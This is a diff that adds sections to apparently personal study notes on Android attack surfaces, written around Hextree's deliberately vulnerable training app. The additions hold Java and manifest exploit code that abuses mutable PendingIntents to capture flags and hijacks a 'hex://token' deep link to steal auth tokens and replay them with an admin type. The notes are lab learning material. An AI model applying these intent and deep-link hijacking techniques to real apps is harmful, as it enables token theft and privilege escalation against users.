@@ -7,6 +7,7 @@
     - [Intent Redirection](#intent-redirection)
     - [Implicit Intents](#implicit-intents)
     - [Delegation via Pending Intents](#delegation-via-pending-intents)
+- [DeepLinks](#deeplinks)
 
 
 ## Interaction with Intents
@@ -146,3 +147,95 @@ if("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())){
 
 
 ### Delegation via Pending Intents
+
+- A PendingIntent is like a pre-written request that your app gives to Android or another app.
+
+- It says: "Later, do this action in my app."
+
+- Used when you want something to happen in the future, even if your app is closed.
+
+- Create a PendingIntent that will open Second_Activity:
+```java
+
+    Intent catcherIntent = new Intent(this,Second_Activity.class);
+    // Must be mutable to allow Flag22Activity to add extras like the flag
+    PendingIntent pendingIntent = PendingIntent.getActivity(
+            this,
+            0,
+            catcherIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
+    );
+
+    Intent exploitIntent = new Intent();
+    exploitIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");
+    exploitIntent.putExtra("PENDING", pendingIntent);
+
+    startActivity(exploitIntent);
+
+```
+> [!NOTE]
+> `FLAG_MUTABLE` is important on Android 12+ to let another app (like Flag22Activity) modify the Intent and add the flag.
+
+- This is Second_Activity that catch the result:
+```java
+      String flag = getIntent().getStringExtra("flag");
+        if (flag != null) {
+            Log.d("FLAG22", "Flag received: " + flag);
+        }
+        // Optional: finish after showing flag
+        finish();
+```
+
+
+- Another example How can we recieve an PendingIntent:
+```java
+        PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("pending_intent");
+        if (pendingIntent != null) {
+            try {
+                Intent intent = new Intent();
+                intent.setAction("io.hextree.attacksurface.GIVE_FLAG");
+                intent.putExtra("code", 42);
+                pendingIntent.send(this, 0, intent);
+            } catch (RuntimeException | PendingIntent.CanceledException e) {
+                throw new RuntimeException(e);
+            }
+
+        }
+```
+
+## DeepLinks
+- Some activities can also be reached by a website in the browser. 
+- This is of course a much more interesting attack model, as it doesn't require a victim to install a malicious app. These web links that result into opening an app are so called deep links.
+
+- Hijacking deeplink Example:
+```xml
+  <activity
+            android:name=".Hextree"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data
+                    android:scheme="hex"
+                    android:host="token"/>
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+```
+```java
+Intent receivedIntent = getIntent();
+if(receivedIntent.getAction() == "android.intent.action.VIEW"){
+    Uri data = receivedIntent.getData();
+    Log.d("queryParameters", String.valueOf(data));
+    String authToken = data.getQueryParameter("authToken");
+    String authChallenge = data.getQueryParameter("authChallenge");
+
+    Intent sendIntent = new Intent();
+    sendIntent.setAction("android.intent.action.VIEW");
+    sendIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity");
+    sendIntent.setData(Uri.parse("hex://token?authToken="+authToken+"&type=admin&authChallenge="+authChallenge));
+    startActivity(sendIntent);
+}
+```
